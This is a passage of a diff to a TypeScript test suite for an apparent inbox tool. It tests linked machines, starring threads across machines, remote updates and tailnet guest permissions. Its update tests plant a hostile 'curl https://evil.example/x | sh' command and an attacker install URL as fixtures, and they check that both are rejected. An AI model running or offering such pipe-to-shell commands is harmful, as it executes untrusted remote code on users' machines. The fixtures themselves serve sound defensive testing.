@@ -33,6 +33,7 @@ import { Client, StreamableHTTPClientTransport } from "@modelcontextprotocol/cli
 import type { TailscaleRunner } from "@plannotator/shared/tailscale";
 import { INBOX_WAKES_META_KEY } from "@plannotator/shared/inbox/connection";
 import { InboxStore } from "@plannotator/shared/inbox/store";
+import { InboxLinks } from "./inbox-links";
 import { heldWords } from "../inbox/api";
 import { startInboxServer } from "./inbox";
 import { machineHeldWords } from "./inbox-machines";
@@ -200,7 +201,7 @@ describe("linked machines, on three real Inboxes", () => {
     for (const m of machines) m.id = (await getJson(m, "/api/inbox/health")).inbox_id as string;
     // Never linked, Phones off: any device request is the unknown route it always was.
     expect((await fetch(`${base(A)}/api/inbox/device/health`, { headers: { Authorization: "Bearer tok_x" } })).status).toBe(404);
-  });
+  }, 60_000);
 
   afterAll(async () => {
     for (const m of machines) {
@@ -1580,8 +1581,8 @@ describe("an agent's snooze_thread of a linked machine's thread", () => {
       expect((await fetch(`http://127.0.0.1:${a.port}/api/inbox/machines/link`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ link: offered.link, address: `http://127.0.0.1:${b.port}`, back: `http://127.0.0.1:${a.port}` }) })).status).toBe(201);
       const onB = await mcp(b.port);
       const project = scratch("plannotator-snooze-agent-restart-project-");
-      const asked = (await onB.callTool({ name: "send_message", arguments: { project_path: project, agent_session: "ses_b", body: "Plain news" } })) as { structuredContent: { thread_id: string } };
-      const reply = (await onB.callTool({ name: "send_message", arguments: { project_path: project, agent_session: "ses_b", body: "More news" } })) as { structuredContent: { thread_id: string; message_id: string } };
+      const asked = (await onB.callTool({ name: "send_message", arguments: { project_path: project, agent_session: "ses_b", body: "Plain news" } })) as { structuredContent: { thread_id: string; message_id: string } };
+      const reply = (await onB.callTool({ name: "send_message", arguments: { project_path: project, agent_session: "ses_b", body: "More news", reply_to: asked.structuredContent.message_id } })) as { structuredContent: { thread_id: string; message_id: string } };
       const thread = asked.structuredContent.thread_id;
       expect(reply.structuredContent.thread_id).toBe(thread);
       await onB.close();
@@ -1656,7 +1657,132 @@ describe("an agent's snooze_thread of a linked machine's thread", () => {
   });
 });
 
-describe("the forward takes no write from a tailnet guest", () => {
+describe("a star on a linked machine's thread lives on that machine (approval inbox-linked-marks)", () => {
+  const dirs: string[] = [];
+  const sandboxWas = process.env.PLANNOTATOR_TEST_SANDBOX;
+  beforeAll(() => {
+    process.env.PLANNOTATOR_TEST_SANDBOX = "1";
+  });
+  afterAll(() => {
+    if (sandboxWas === undefined) delete process.env.PLANNOTATOR_TEST_SANDBOX;
+    else process.env.PLANNOTATOR_TEST_SANDBOX = sandboxWas;
+    for (const dir of dirs) rmSync(dir, { recursive: true, force: true });
+  });
+  const scratch = (prefix: string) => {
+    const dir = realpathSync(mkdtempSync(join(tmpdir(), prefix)));
+    dirs.push(dir);
+    return dir;
+  };
+  const start = (dataDir: string) => startInboxServer({ dataDir, binaryPath: null, phones: false, tailscale: scriptedTailscale().run });
+  const at = (port: number) => `http://127.0.0.1:${port}`;
+  const list = async (port: number) => (await (await fetch(`${at(port)}/api/inbox/threads?archived=exclude&snoozed=exclude&machines=1`)).json()) as Json;
+  /** The Starred rows of a merged list, each with the machine that holds it. */
+  const starred = async (port: number) => ((await list(port)).pins as Json[]).map((row) => [row.thread_id, row.machine]);
+  const post = async (port: number, path: string, body: Json) => {
+    const health = (await (await fetch(`${at(port)}/api/inbox/health`)).json()) as Json;
+    return fetch(`${at(port)}${path}`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ serverSession: health.serverSession, ...body }) });
+  };
+  let keys = 0;
+  /** A's window writing to B through the forward, with the key the window adds. */
+  const forward = (port: number, machine: string, route: string, body: Json) => post(port, `/api/inbox/m/${machine}/${route}`, { idempotency_key: `window-star-${++keys}`, ...body });
+
+  test("starred from A, it is stored on B and shows on both; unstarred on B, A follows; order and Undo go to B; B away, it waits and lands", async () => {
+    const dataA = scratch("plannotator-star-linked-a-");
+    const dataB = scratch("plannotator-star-linked-b-");
+    const a = await start(dataA);
+    let b = await start(dataB);
+    let client: Client | null = null;
+    try {
+      const offered = (await (await fetch(`${at(b.port)}/api/inbox/machines/offer`, { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" })).json()) as Json;
+      const linked = await fetch(`${at(a.port)}/api/inbox/machines/link`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ link: offered.link, address: at(b.port), back: at(a.port) }) });
+      expect(linked.status).toBe(201);
+      const bId = (JSON.parse(readFileSync(join(dataA, "inbox", "machines.json"), "utf8")) as Json).links[0].id as string;
+      client = new Client({ name: "inbox-machines-star", version: "1.0.0" });
+      await client.connect(new StreamableHTTPClientTransport(new URL(`${at(b.port)}/mcp`)));
+      const project = scratch("plannotator-star-linked-project-");
+      const send = async (body: string) => ((await client!.callTool({ name: "send_message", arguments: { project_path: project, agent_session: "ses_b", body } })) as { structuredContent: { thread_id: string } }).structuredContent.thread_id;
+      const one = await send("First news");
+      const two = await send("Second news");
+      await waitFor("B's threads on A", async () => JSON.stringify((await list(a.port)).sections).includes(two));
+      const view = async () => (((await (await fetch(`${at(a.port)}/api/inbox/machines`)).json()) as Json).machines as Json[]).find((m) => m.id === bId)!;
+      expect((await view()).marks).toEqual(["star"]);
+
+      // Starred from A: one copy, on B. A's answer comes after its list of B was read, so its next read shows the star.
+      expect((await forward(a.port, bId, `threads/${one}/pin`, { pinned: true })).status).toBe(200);
+      expect(b.store.pins().map((pin) => pin.thread_id)).toEqual([one]);
+      expect(a.store.pins()).toEqual([]);
+      expect(existsSync(join(dataA, "inbox", "pins.json"))).toBe(false);
+      expect(await starred(a.port)).toEqual([[one, bId]]);
+      expect(await starred(b.port)).toEqual([[one, bId]]);
+
+      // Unstarred in B's own window: A's list follows, with no write of A's.
+      expect((await post(b.port, `/api/inbox/threads/${one}/pin`, { pinned: false })).status).toBe(200);
+      await waitFor("the star gone on A", async () => (await starred(a.port)).length === 0);
+
+      // Move and Undo from A act on B's order.
+      for (const id of [one, two]) expect((await forward(a.port, bId, `threads/${id}/pin`, { pinned: true })).status).toBe(200);
+      expect((await forward(a.port, bId, "pins", { order: [two, one] })).status).toBe(200);
+      expect(b.store.pins().map((pin) => pin.thread_id)).toEqual([two, one]);
+      const pinnedAt = b.store.pins()[1]!.pinned_at;
+      expect((await forward(a.port, bId, `threads/${one}/pin`, { pinned: false })).status).toBe(200);
+      expect((await forward(a.port, bId, "pins", { restore: { thread_id: one, index: 1, pinned_at: pinnedAt } })).status).toBe(200);
+      expect(b.store.pins().map((pin) => [pin.thread_id, pin.pinned_at])).toEqual([[two, expect.any(String)], [one, pinnedAt]]);
+      expect(await starred(a.port)).toEqual([[two, bId], [one, bId]]);
+
+      // B away: the star waits (202, nothing drawn here) and lands when B is back.
+      expect((await forward(a.port, bId, `threads/${two}/pin`, { pinned: false })).status).toBe(200);
+      await client.close();
+      client = null;
+      b.stop();
+      await waitFor("B offline on A", async () => (await view()).state === "offline", 30_000);
+      const held = await forward(a.port, bId, `threads/${two}/pin`, { pinned: true });
+      expect(held.status).toBe(202);
+      expect(a.store.pins()).toEqual([]);
+      b = await start(dataB);
+      await waitFor("the held star on B", () => b.store.pins().some((pin) => pin.thread_id === two), 45_000);
+      await waitFor("the star on A", async () => JSON.stringify(await starred(a.port)) === JSON.stringify([[one, bId], [two, bId]]), 15_000);
+    } finally {
+      await client?.close().catch(() => {});
+      a.stop();
+      b.stop();
+    }
+  }, 120_000);
+
+  test("an older machine (its list names no marks): its stars are not drawn here and it is not offered a star; one that names `star` is", async () => {
+    const thread = "msg_01K0000000000000000000000S";
+    for (const marks of [undefined, ["star"]]) {
+      const id = "ibx_01K0000000000000000000000S";
+      const door = Bun.serve({
+        hostname: "127.0.0.1",
+        port: 0,
+        idleTimeout: 0,
+        fetch(req) {
+          const route = new URL(req.url).pathname.replace("/api/inbox/device/", "");
+          if (route === "health") return Response.json({ ok: true, inbox_id: id, machine_links: 1, version: "0.28.62" });
+          if (route === "events") return new Response(new ReadableStream({ start: (c) => c.enqueue(new TextEncoder().encode(`event: hello\ndata: {"cursor":0}\n\n`)) }), { headers: { "Content-Type": "text/event-stream" } });
+          const row = { thread_id: thread, project: { id: "prj_x" }, resolved_at: null };
+          if (route === "threads") return Response.json({ cursor: 0, sections: [{ id: "new", threads: [row] }], projects: [], pins: [row], ...(marks ? { marks } : {}) });
+          return Response.json({ code: "device_route_not_found", error: "Not a phone route." }, { status: 404 });
+        },
+      });
+      const dataDir = scratch("plannotator-star-linked-older-");
+      mkdirSync(join(dataDir, "inbox"), { recursive: true });
+      writeFileSync(join(dataDir, "inbox", "machines.json"), JSON.stringify({ v: 1, self: { id: "ibx_01K00000000000000000000009" }, links: [{ id, name: "Mini", token: "tok_0", transport: { kind: "tailnet", url: at(door.port as number) }, device_id: null, linked_at: "2026-10-30T00:00:00Z" }] }), { mode: 0o600 });
+      const inbox = await start(dataDir);
+      try {
+        const view = async () => (((await (await fetch(`${at(inbox.port)}/api/inbox/machines`)).json()) as Json).machines as Json[]).find((m) => m.id === id);
+        await waitFor("that machine's list", async () => typeof (await view())?.list_cursor === "number");
+        expect((await view())!.marks).toEqual(marks ?? []);
+        expect(await starred(inbox.port)).toEqual(marks ? [[thread, id]] : []);
+      } finally {
+        inbox.stop();
+        door.stop(true);
+      }
+    }
+  });
+});
+
+describe("a tailnet guest through the forward: it answers, it never starts an agent there", () => {
   const MAGIC = "laptop.tail0000.ts.net";
   const OWNER = "owner@example.com";
   const GUEST = "guest@example.com";
@@ -1702,7 +1828,7 @@ describe("the forward takes no write from a tailnet guest", () => {
    * A (the MacBook, `tagged`: a tagged Tailscale device with no owner) linked both ways to B (the Mini) on loopback,
    * A's window published on the tailnet with GUEST in `inboxTailscaleAllow`, and an agent's question waiting on B.
    */
-  async function linkedPair(prefix: string, tagged: boolean) {
+  async function linkedPair(prefix: string, tagged: boolean, far: Partial<Parameters<typeof startInboxServer>[0]> = {}) {
     const root = realpathSync(mkdtempSync(join(tmpdir(), prefix)));
     roots.push(root);
     const dataA = join(root, "macbook");
@@ -1718,7 +1844,7 @@ describe("the forward takes no write from a tailnet guest", () => {
     });
     const tsB = ownedTailscale();
     const a = await startInboxServer({ dataDir: dataA, binaryPath: null, phones: false, tailscale: ownedTailscale(tagged).run });
-    const b = await startInboxServer({ dataDir: dataB, binaryPath: null, phones: false, tailscale: tsB.run });
+    const b = await startInboxServer({ dataDir: dataB, binaryPath: null, phones: false, tailscale: tsB.run, ...far });
     const client = new Client({ name: "inbox-forward-owner", version: "1.0.0" });
     const stop = async () => {
       await client.close().catch(() => {});
@@ -1754,10 +1880,10 @@ describe("the forward takes no write from a tailnet guest", () => {
       const page = `https://${MAGIC}:${a.port}`;
       const tailnetHeaders = (login: string, type: string) => ({ Host: `${MAGIC}:${a.port}`, "Tailscale-User-Login": login, "Content-Type": type, Origin: page, "Sec-Fetch-Site": "same-origin" });
       /** A read or a JSON write through serve, as that login's browser sends it. */
-      const throughServe = async (login: string, path: string, body?: Json) =>
+      const throughServe = async (login: string, path: string, body?: Json, extra: Record<string, string> = {}) =>
         fetch(`http://127.0.0.1:${listener}${path}`, {
           method: body ? "POST" : "GET",
-          headers: body ? tailnetHeaders(login, "application/json") : { Host: `${MAGIC}:${a.port}`, "Tailscale-User-Login": login },
+          headers: { ...(body ? tailnetHeaders(login, "application/json") : { Host: `${MAGIC}:${a.port}`, "Tailscale-User-Login": login }), ...extra },
           ...(body ? { body: JSON.stringify({ serverSession: await sessionOf(a.port), ...body }) } : {}),
         });
       /** A file through serve to B (an upload is never held). */
@@ -1775,7 +1901,7 @@ describe("the forward takes no write from a tailnet guest", () => {
         const question = ((await thread()).thread.messages[0].questions as Json[])[0]!;
         return { idempotency_key: key, questions: [{ key: question.key, revision: question.revision, answer: { v: 1, key: question.key, kind: "single", prompt: question.prompt, selected: [selected] } }] };
       };
-      return { a, b, dataA, mini, asked, listener, sessionOf, throughServe, uploadThroughServe, thread, onB, personOnB, pickBody, stop };
+      return { a, b, dataA, dataB, mini, asked, listener, sessionOf, throughServe, uploadThroughServe, thread, onB, personOnB, pickBody, stop };
     } catch (error) {
       await stop();
       throw error;
@@ -1784,7 +1910,283 @@ describe("the forward takes no write from a tailnet guest", () => {
 
   const delivered = async (answer: Response) => [answer.status, answer.headers.get("x-plannotator-outbox")];
 
-  test("a tailnet guest of this machine never writes to a linked machine, though it reads; the owner writes from every path: this window, another device, a plain local call", async () => {
+  test("Update on a linked machine: the owner from any path, never a guest, another site, the generic forward or the outbox", async () => {
+    const w = await linkedPair("plannotator-machines-update-gates-", false);
+    try {
+      const { a, b, mini } = w;
+      const route = `/api/inbox/machines/${mini}/update`;
+      // A tailnet guest: refused, read and write.
+      expect((await w.throughServe(GUEST, route)).status).toBe(403);
+      const guest = await w.throughServe(GUEST, route, {});
+      expect(guest.status).toBe(403);
+      expect(((await guest.json()) as Json).code).toBe("owner_only");
+      // The owner over the tailnet: it reaches that machine (a dev build here, so it answers that and runs nothing).
+      const owner = await w.throughServe(OWNER, route, {});
+      expect(owner.status).toBe(409);
+      expect(((await owner.json()) as Json).code).toBe("update_dev_build");
+      // A plain local call too.
+      const local = await fetch(`http://127.0.0.1:${a.port}${route}`, { method: "POST", body: JSON.stringify({ serverSession: await w.sessionOf(a.port) }) });
+      expect(local.status).toBe(409);
+      // Another site's page, whatever it claims and however it posts.
+      const base = `http://127.0.0.1:${a.port}`;
+      for (const headers of [{ Origin: "https://evil.example" }, { Origin: "null" }, { "Sec-Fetch-Site": "cross-site" }, { Origin: "http://127.0.0.1:1", "Content-Type": "text/plain" }] as Record<string, string>[]) {
+        const refused = await fetch(`${base}${route}`, { method: "POST", headers, body: JSON.stringify({ serverSession: await w.sessionOf(a.port) }) });
+        expect(refused.status).toBe(403);
+        // A read gets nothing either: that machine's facts stay with this window.
+        const read = await fetch(`${base}${route}`, { headers });
+        expect(read.status).toBe(403);
+      }
+      // A page on another site, through the tailnet, read and write.
+      for (const body of [undefined, {}]) {
+        const farPage = await w.throughServe(OWNER, route, body, { Origin: "https://evil.example", "Sec-Fetch-Site": "cross-site" });
+        expect(farPage.status).toBe(403);
+      }
+      // A stale tab.
+      const stale = await fetch(`${base}${route}`, { method: "POST", body: JSON.stringify({ serverSession: "old" }) });
+      expect(stale.status).toBe(409);
+      expect(((await stale.json()) as Json).code).not.toBe("update_dev_build");
+      // Not through the generic forward or the outbox, for anyone.
+      for (const method of ["GET", "POST"]) {
+        const forwarded = await fetch(`${base}/api/inbox/m/${mini}/update`, { method, ...(method === "POST" ? { body: JSON.stringify({ serverSession: await w.sessionOf(a.port) }) } : {}) });
+        expect(forwarded.status).toBe(404);
+        expect(((await forwarded.json()) as Json).code).toBe("not_found");
+      }
+      expect(existsSync(join(w.dataA, "inbox", "outbox", `${mini}.jsonl`))).toBe(false);
+      // What this window shows of that machine is only what it picked by name: no URL and no command from there.
+      const details = (await (await fetch(`${base}${route}`)).json()) as Json;
+      expect(Object.keys(details).sort()).toEqual(["command", "current", "failure", "log", "open_reviews", "platform", "update"]);
+      expect(details.command).toContain("plannotator.ai/install");
+      // An encoded name is not a way around the forward's refusal.
+      expect((await fetch(`${base}/api/inbox/m/${mini}/%75pdate`)).status).toBe(404);
+      void b;
+    } finally {
+      await w.stop();
+    }
+  });
+
+  test("the press, end to end: the far machine installs its own answer whatever the body says, restarts itself, and this window hears each step", async () => {
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "plannotator-machines-update-press-")));
+    roots.push(root);
+    const home = join(root, "Users", "ramos");
+    mkdirSync(home, { recursive: true });
+    const binary = join(home, "plannotator");
+    writeFileSync(binary, "old");
+    const launches: { version: string; lockPath: string; resultPath: string }[] = [];
+    let onDisk = "0.28.40";
+    let restarts = 0;
+    const answer = async () => ({ ok: true as const, release: { tag: "v0.28.42", body: "" } });
+    // That machine's own check names the release, which needs its checks on.
+    const checks = process.env.PLANNOTATOR_UPDATE_CHECK;
+    delete process.env.PLANNOTATOR_UPDATE_CHECK;
+    restore.push(() => {
+      if (checks === undefined) delete process.env.PLANNOTATOR_UPDATE_CHECK;
+      else process.env.PLANNOTATOR_UPDATE_CHECK = checks;
+    });
+    const w = await linkedPair("plannotator-machines-update-press-pair-", false, {
+      dataDir: join(home, ".plannotator"),
+      version: "0.28.40",
+      binaryPath: binary,
+      healthTickMs: 100,
+      onRestartRequested: () => void restarts++,
+      updates: {
+        home,
+        fetchRelease: answer,
+        fetchReleasePage: answer,
+        fetchReleaseTag: answer,
+        isManaged: () => true,
+        listSessions: () => [],
+        probeVersion: async () => onDisk,
+        launchInstaller: (launch) => void launches.push(launch),
+      },
+    });
+    try {
+      const base = `http://127.0.0.1:${w.a.port}`;
+      const route = `/api/inbox/machines/${w.mini}/update`;
+      const row = async () => ((await (await fetch(`${base}/api/inbox/machines`)).json()) as Json).machines.find((m: Json) => m.id === w.mini);
+      await waitFor("the far machine behind", async () => (await row())?.update?.phase === "behind");
+      expect((await row()).update).toMatchObject({ phase: "behind", target: "0.28.42", from: "0.28.40", can_update: true, self_update: true });
+      // The dialog's read: the log as ~/…, with no name in any field.
+      const details = await (await fetch(`${base}${route}`)).text();
+      expect(JSON.parse(details).log.startsWith("~/")).toBe(true);
+      expect(details).not.toContain("ramos");
+      // A body naming another version and another place to download from.
+      const pressed = await fetch(`${base}${route}`, {
+        method: "POST",
+        body: JSON.stringify({ serverSession: await w.sessionOf(w.a.port), version: "9.9.9", url: "https://evil.example/install.sh" }),
+      });
+      expect(await pressed.json()).toEqual({ ok: true, outcome: "launched" });
+      expect(launches.map((launch) => launch.version)).toEqual(["v0.28.42"]);
+      expect(existsSync(join(w.dataA, "inbox", "outbox", `${w.mini}.jsonl`))).toBe(false);
+      await waitFor("updating on this window", async () => (await row())?.update?.phase === "updating");
+      // The remembered flags reach the command this window shows.
+      writeFileSync(join(home, ".plannotator", "install-flags.json"), JSON.stringify({ flags: ["skip-gemini"] }));
+      expect(((await (await fetch(`${base}${route}`)).json()) as Json).command).toBe("curl -fsSL https://plannotator.ai/install.sh | bash -s -- --skip-gemini");
+      // The second press, from another tab, joins it.
+      const again = await fetch(`${base}${route}`, { method: "POST", body: JSON.stringify({ serverSession: await w.sessionOf(w.a.port) }) });
+      expect(await again.json()).toEqual({ ok: true, outcome: "joined" });
+      expect(launches).toHaveLength(1);
+      // The binary is swapped and the install script runs on (skills, plugins): that machine reads ready, this window still says Updating, and nothing restarts.
+      onDisk = "0.28.42";
+      writeFileSync(binary, "new");
+      await waitFor("the far machine ready", async () => ((await (await fetch(`http://127.0.0.1:${w.b.port}/api/inbox/health`)).json()) as Json).update?.state === "ready", 6_000);
+      for (let i = 0; i < 10; i++) {
+        expect((await row()).update).toMatchObject({ phase: "updating", target: "0.28.42", from: "0.28.40" });
+        await Bun.sleep(50);
+      }
+      expect(restarts).toBe(0);
+      // The install ends: the far Inbox restarts itself, once, with no window of its own open, and this window says so.
+      writeFileSync(launches[0]!.resultPath, JSON.stringify({ version: "v0.28.42", exitCode: 0 }));
+      rmSync(launches[0]!.lockPath, { force: true });
+      await waitFor("the far machine restarting itself", () => restarts === 1, 6_000);
+      expect(restarts).toBe(1);
+      await waitFor("restarting on this window", async () => (await row())?.update?.phase === "restarting", 6_000);
+      expect((await row()).update).toMatchObject({ target: "0.28.42", from: "0.28.40" });
+    } finally {
+      await w.stop();
+    }
+  });
+
+  test("asleep: the press sends nothing and holds nothing, so nothing runs when the machine wakes", async () => {
+    const w = await linkedPair("plannotator-machines-update-asleep-", false);
+    try {
+      const base = `http://127.0.0.1:${w.a.port}`;
+      const row = async () => ((await (await fetch(`${base}/api/inbox/machines`)).json()) as Json).machines.find((m: Json) => m.id === w.mini);
+      w.b.stop();
+      await waitFor("the far machine away", async () => (await row())?.state !== "online");
+      const asleep = await fetch(`${base}/api/inbox/machines/${w.mini}/update`, { method: "POST", body: JSON.stringify({ serverSession: await w.sessionOf(w.a.port) }) });
+      expect(asleep.status).toBe(503);
+      expect(((await asleep.json()) as Json).code).toBe("machine_offline");
+      expect(existsSync(join(w.dataA, "inbox", "outbox", `${w.mini}.jsonl`))).toBe(false);
+    } finally {
+      await w.stop();
+    }
+  });
+
+  test("a door that answers more than it should, and a press that says up to date: only what this window picked shows, and the word goes", async () => {
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "plannotator-machines-update-door-")));
+    roots.push(root);
+    const FAR = "ibx_01K00000000000000000000001";
+    const posts: string[] = [];
+    const door = Bun.serve({
+      hostname: "127.0.0.1",
+      port: 0,
+      idleTimeout: 0,
+      async fetch(req) {
+        const route = new URL(req.url).pathname.replace("/api/inbox/device/", "");
+        if (route === "health") return Response.json({ ok: true, inbox_id: FAR, machine_links: 1, machine_update: 1, self_update: true, version: "0.28.50", update: null });
+        if (route === "threads") return Response.json({ cursor: 0, sections: [] });
+        if (route === "events") return new Response(new ReadableStream({ start: (c) => c.enqueue(new TextEncoder().encode("event: hello\ndata: {\"cursor\":0}\n\n")) }), { headers: { "Content-Type": "text/event-stream" } });
+        if (route === "update" && req.method === "POST") {
+          posts.push(await req.text());
+          return Response.json({ outcome: "up-to-date" });
+        }
+        if (route === "update") return Response.json({ current: "0.28.50", update: null, platform: "darwin", command: "curl https://evil.example/x | sh", log: "curl https://evil.example/x | sh", flags: ["--evil"], open_reviews: 0, failure: null });
+        return Response.json({ code: "device_route_not_found" }, { status: 404 });
+      },
+    });
+    const dataDir = join(root, "viewer");
+    mkdirSync(dataDir, { recursive: true });
+    InboxLinks.open(dataDir).put({ id: FAR, name: "Level", token: "tok", transport: { kind: "tailnet", url: `http://127.0.0.1:${door.port}` }, device_id: null, linked_at: "2026-11-01T00:00:00Z" });
+    // This Inbox is a build ahead of GitHub's latest.
+    const viewer = await startInboxServer({ dataDir, version: "0.28.60", binaryPath: null, phones: false, updates: { listSessions: () => [] } });
+    try {
+      const base = `http://127.0.0.1:${viewer.port}`;
+      const route = `${base}/api/inbox/machines/${FAR}/update`;
+      const row = async () => ((await (await fetch(`${base}/api/inbox/machines`)).json()) as Json).machines.find((m: Json) => m.id === FAR);
+      await waitFor("the machine online and behind this one", async () => (await row())?.update?.phase === "behind");
+      const details = await (await fetch(route)).text();
+      expect(details).not.toContain("evil");
+      expect(JSON.parse(details).command).toBe("curl -fsSL https://plannotator.ai/install.sh | bash");
+      const session = ((await (await fetch(`${base}/api/inbox/health`)).json()) as Json).serverSession as string;
+      const pressed = await fetch(route, { method: "POST", body: JSON.stringify({ serverSession: session }) });
+      expect(pressed.status).toBe(409);
+      expect(await pressed.json()).toEqual({ error: "Level is up to date.", code: "update_up_to_date" });
+      expect(posts).toEqual(["{}"]);
+      expect((await row()).update).toBeNull();
+    } finally {
+      viewer.stop();
+      door.stop(true);
+    }
+  });
+
+  test("an Inbox from before the route: the row says it cannot be updated from here, the read says too old, the press runs nothing", async () => {
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "plannotator-machines-update-old-")));
+    roots.push(root);
+    const OLD = "ibx_01K00000000000000000000000";
+    const posts: string[] = [];
+    // A door as 0.28.44's: its health, its list, and a 404 for `update`.
+    const door = Bun.serve({
+      hostname: "127.0.0.1",
+      port: 0,
+      idleTimeout: 0,
+      fetch(req) {
+        const route = new URL(req.url).pathname.replace("/api/inbox/device/", "");
+        if (req.method === "POST") posts.push(route);
+        if (route === "health") return Response.json({ ok: true, inbox_id: OLD, machine_links: 1, version: "0.28.44" });
+        if (route === "threads") return Response.json({ cursor: 0, sections: [] });
+        if (route === "events") return new Response(new ReadableStream({ start: (c) => c.enqueue(new TextEncoder().encode("event: hello\ndata: {\"cursor\":0}\n\n")) }), { headers: { "Content-Type": "text/event-stream" } });
+        return Response.json({ code: "device_route_not_found" }, { status: 404 });
+      },
+    });
+    const dataDir = join(root, "viewer");
+    mkdirSync(dataDir, { recursive: true });
+    InboxLinks.open(dataDir).put({ id: OLD, name: "Mac mini", token: "tok", transport: { kind: "tailnet", url: `http://127.0.0.1:${door.port}` }, device_id: null, linked_at: "2026-11-01T00:00:00Z" });
+    const viewer = await startInboxServer({ dataDir, version: "0.28.60", binaryPath: null, phones: false, updates: { listSessions: () => [] } });
+    try {
+      const base = `http://127.0.0.1:${viewer.port}`;
+      const row = async () => ((await (await fetch(`${base}/api/inbox/machines`)).json()) as Json).machines.find((m: Json) => m.id === OLD);
+      await waitFor("the older machine online", async () => (await row())?.state === "online");
+      expect((await row()).update).toMatchObject({ phase: "behind", target: "0.28.60", from: "0.28.44", can_update: false });
+      const session = ((await (await fetch(`${base}/api/inbox/health`)).json()) as Json).serverSession as string;
+      expect(await (await fetch(`${base}/api/inbox/machines/${OLD}/update`)).json()).toEqual({ too_old: true, current: "0.28.44" });
+      const pressed = await fetch(`${base}/api/inbox/machines/${OLD}/update`, { method: "POST", body: JSON.stringify({ serverSession: session }) });
+      expect(pressed.status).toBe(409);
+      expect(((await pressed.json()) as Json).code).toBe("machine_too_old");
+      expect(existsSync(join(dataDir, "inbox", "outbox", `${OLD}.jsonl`))).toBe(false);
+    } finally {
+      viewer.stop();
+      door.stop(true);
+    }
+  });
+
+  test("where Tailscale names no owner (a tagged machine), a login let on is treated as you: Update is never refused", async () => {
+    const w = await linkedPair("plannotator-machines-update-tagged-", true);
+    try {
+      const answer = await w.throughServe(GUEST, `/api/inbox/machines/${w.mini}/update`, {});
+      expect(answer.status).toBe(409);
+      expect(((await answer.json()) as Json).code).toBe("update_dev_build");
+    } finally {
+      await w.stop();
+    }
+  });
+
+  test("a phone's token does not reach `update` on the door, read or write", async () => {
+    const root = realpathSync(mkdtempSync(join(tmpdir(), "plannotator-machines-update-phone-")));
+    roots.push(root);
+    // Pairing also asks for a mailbox: never the real relay.
+    const relayUrl = process.env.PLANNOTATOR_RELAY_URL;
+    process.env.PLANNOTATOR_RELAY_URL = "http://127.0.0.1:9";
+    restore.push(() => {
+      if (relayUrl === undefined) delete process.env.PLANNOTATOR_RELAY_URL;
+      else process.env.PLANNOTATOR_RELAY_URL = relayUrl;
+    });
+    const inbox = await startInboxServer({ dataDir: join(root, "d"), binaryPath: null, phones: true, tailscale: ownedTailscale().run });
+    try {
+      const base = `http://127.0.0.1:${inbox.port}`;
+      const made = (await (await fetch(`${base}/api/inbox/pairing`, { method: "POST", body: "{}" })).json()) as Json;
+      const paired = await fetch(`${base}/api/inbox/device/pair`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ code: made.offer.code, name: "iPhone", platform: "ios" }) });
+      const { token } = (await paired.json()) as { token: string };
+      for (const method of ["GET", "POST"]) {
+        const refused = await fetch(`${base}/api/inbox/device/update`, { method, headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" }, ...(method === "POST" ? { body: "{}" } : {}) });
+        expect(refused.status).toBe(404);
+        expect(((await refused.json()) as Json).code).toBe("device_route_not_found");
+      }
+    } finally {
+      inbox.stop();
+    }
+  });
+
+  test("a tailnet guest of this machine answers a linked machine's thread as here, but never starts an agent there; the owner writes from every path: this window, another device, a plain local call", async () => {
     const w = await linkedPair("plannotator-machines-forward-owner-", false);
     try {
       const { a, mini, asked } = w;
@@ -1793,21 +2195,14 @@ describe("the forward takes no write from a tailnet guest", () => {
       expect(read.status).toBe(200);
       const cursor = ((await read.json()) as Json).cursor as number;
 
-      // The guest, from A's own page: every write to B is refused, and none reaches B.
-      for (const [route, body] of [
-        [`messages/${asked.message_id}/reply`, { idempotency_key: "guest-reply", words: "Guest says retry.", seen_through_seq: cursor }],
-        [`messages/${asked.message_id}/picks`, await w.pickBody("guest-pick", "Retry")],
-        [`threads/${asked.thread_id}/read`, { idempotency_key: "guest-read" }],
-        [`threads/${asked.thread_id}/snooze`, { idempotency_key: "guest-snooze", until: tomorrow() }],
-      ] as const) {
-        const answer = await w.throughServe(GUEST, `/api/inbox/m/${mini}/${route}`, body);
-        expect([route, answer.status, ((await answer.json()) as Json).code]).toEqual([route, 403, "owner_only"]);
-      }
-      const upload = await w.uploadThroughServe(GUEST, "guest-up");
-      expect([upload.status, ((await upload.json()) as Json).code]).toEqual([403, "owner_only"]);
-      expect(await w.personOnB()).toHaveLength(0);
-      expect(((await w.onB()).messages[0].questions as Json[])[0]!.state).toBe("open");
-      expect(existsSync(join(w.dataA, "inbox", "outbox", `${mini}.jsonl`))).toBe(false);
+      // The guest, from A's own page (owner ruling 2026-11-11): its reply and its file reach B as the owner's do.
+      const guestReply = await w.throughServe(GUEST, `/api/inbox/m/${mini}/messages/${asked.message_id}/reply`, { idempotency_key: "guest-reply", words: "Guest says retry.", seen_through_seq: cursor });
+      expect(await delivered(guestReply)).toEqual([200, "delivered"]);
+      expect((await w.uploadThroughServe(GUEST, "guest-up")).status).toBe(200);
+      // Starting an agent on B stays the owner's, as it is on A: refused, and nothing is held for B.
+      const start = await w.throughServe(GUEST, `/api/inbox/m/${mini}/messages`, { idempotency_key: "guest-start", body: "Fix it.", to: { launch: { agent: "claude-code", project_id: "prj_x" } } });
+      expect([start.status, ((await start.json()) as Json).code]).toEqual([403, "owner_only"]);
+      expect(await w.personOnB()).toHaveLength(1);
 
       // The owner keeps everything through the forward, each answer delivered to B once.
       // The owner's window on this machine.
@@ -1840,19 +2235,23 @@ describe("the forward takes no write from a tailnet guest", () => {
       });
       expect(bareUpload.status).toBe(200);
       const landed = (await w.personOnB()).map((m) => m.body as string);
-      expect(landed).toHaveLength(3);
-      expect(landed[0]).toStartWith("From the MacBook's window.");
-      expect(landed[1]).toStartWith("From the owner's phone browser.");
-      expect(landed[2]).toStartWith("From a script on the MacBook.");
+      expect(landed).toHaveLength(4);
+      expect(landed[0]).toStartWith("Guest says retry.");
+      expect(landed[1]).toStartWith("From the MacBook's window.");
